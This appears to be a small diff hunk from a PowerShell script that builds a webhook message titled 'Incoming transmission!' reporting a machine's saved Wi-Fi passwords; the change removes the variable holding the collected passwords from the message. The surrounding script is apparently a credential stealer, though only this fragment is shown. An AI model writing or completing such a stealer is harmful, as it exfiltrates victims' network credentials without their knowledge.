@@ -24,7 +24,7 @@ param (
 
 $forEmbed =  [PSCustomObject]@{
     'title'       = 'Incoming transmission!'
-    'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' + @($loggedwifis)
+    'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: '
     'color'       = '16744960'
 }
 
